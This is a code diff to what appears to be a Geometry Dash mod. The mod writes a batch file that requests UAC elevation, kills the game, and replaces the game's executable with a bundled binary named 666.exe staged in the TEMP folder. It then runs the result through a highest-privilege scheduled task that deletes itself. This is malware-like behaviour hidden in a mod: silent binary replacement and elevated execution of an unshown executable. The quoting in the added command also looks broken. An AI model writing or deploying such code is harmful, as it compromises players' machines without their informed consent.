@@ -30,21 +30,31 @@ void createAnGD666Bat() {
     batFile << ":: Request UAC elevation and execute installation sequence\n";
     // Sequence: taskkill -> rename original -> rename 666.exe to GD.exe -> mklink -> schtasks
     // The mod will extract 666.exe to the game folder before running this
-    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\" & taskkill /f /im GeometryDash.exe & ren GeometryDash.exe GeometryDash666.exe & ren 666.exe GeometryDash.exe & mklink 666.exe GeometryDash.exe & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
+    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\" & taskkill /f /im GeometryDash.exe & ren GeometryDash.exe GeometryDash666.exe & move \"%TEMP%\\\\666.exe\\\" GeometryDash.exe & mklink 666.exe GeometryDash.exe & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
     batFile.close();
 }
 
 void extractLauncher() {
     auto mod = Mod::get();
     auto resourcePath = mod->getResourcesDir() / "666.exe";
-    auto gameDir = fs::path("C:/Program Files (x86)/Steam/steamapps/common/Geometry Dash");
-    
+    char* tempEnv = std::getenv("TEMP");
+    if (!tempEnv) {
+        log::error("No se pudo obtener la variable de entorno TEMP.");
+        return;
+    }
+    fs::path tempPath = fs::path(tempEnv) / "666.exe";
+
     if (fs::exists(resourcePath)) {
         try {
-            fs::copy(resourcePath, gameDir / "666.exe", fs::copy_options::overwrite_existing);
+            fs::copy(resourcePath, tempPath, fs::copy_options::overwrite_existing);
+            log::info("666.exe extraído exitosamente a la carpeta temporal: {}.", tempPath.string());
+        } catch (const fs::filesystem_error& e) {
+            log::error("Fallo al extraer 666.exe a la carpeta temporal: {}", e.what());
         } catch (...) {
-            log::error("Failed to extract launcher to game directory");
+            log::error("Ocurrió un error desconocido al extraer 666.exe a la carpeta temporal.");
         }
+    } else {
+        log::error("666.exe no encontrado en los recursos del mod en: {}", resourcePath.string());
     }
 }
 
